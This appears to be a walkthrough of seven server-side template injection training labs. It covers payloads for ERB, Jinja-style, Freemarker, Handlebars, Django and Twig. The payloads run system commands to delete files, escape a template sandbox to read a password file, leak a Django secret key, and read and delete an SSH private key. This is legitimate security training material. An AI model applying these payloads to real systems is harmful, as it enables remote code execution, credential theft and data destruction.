1. This lab has a server side template injection in its `message` parameter. It uses ERB, which has the `system` method to execute arbitrary system commands. As a result, the following payload can be used to solve the lab: `/?message=<%=system(%27rm%20/home/carlos/morale.txt%27)%>`
2. This lab has a server side template injection in its preferred name feature. When changing your preferred name, a POST request is sent to the server with the `blog-post-author-display` value set to `user.name`, `user.nickname`, or `user.first_name`. This can be injected, and is then used in a template when loading user comments on a blog post. By commenting on a blog post, sending the following payload will cause a server side template injection whenever the comment is loaded: `user.name}}{%import%20os%}{{os.system('rm%20/home/carlos/morale.txt')}}`
3. This lab allows the user to edit templates directly. By inputting an invalid template, you can find that it's using the freemarker templating engine. From there, it can be trivially exploited using a known freemarker RCE template: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}`
4. This lab is the same as the first, but by using an invalid template syntax you can find that it uses handlebars. There are well-known handlebars RCE injections, so one can be modified for this lab. The following payload solves the lab: `/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d`
5. This lab is the same as the 3rd, but uses Django instead. By using the `{%debug%}` built-in template, you can see that you have access to the `settings` variable made by Django. According to the documentation, this variable is where the secret key is stored, and can be retrieved with the template `{{settings.SECRET_KEY}}`
6. This lab is the same as the previous, but uses a sandboxed version of Freemarker. However, the `product` object is still accessible, and the object tree can be navigated from there. The following payload will print the contents of the target file with the characters converted to decimal bytes: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`. Converting the bytes back into ASCII characters retrieves the file contents
7. This lab is the same as the 2nd lab, but this time uses the PHP-base twig templating engine. When attempting to upload an invalid image, the error message leaks the existence of `/home/carlos/User.php`, as well as the existence of the `user.setAvatar()` method. By attempting to call this in an injected template, it is possible to determine that the calling syntax is `user.setAvatar(<path to file>, 'image/jpg')` in order to trick the MIME type. By injecting this template and then accessing `/avatar?avatar=wiener`, we an get arbitrary file read. This can be used to leak the source of the previously mentioned `User.php` file in order to see what other methods are available. This shows the existence of the `gdprDelete()` method, which deletes a user's avatar. As such, the following payload solves the lab by setting the user's avatar to the desired file and immediately calling the `gdprDelete()` method: `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')}}{{user.gdprDelete()`
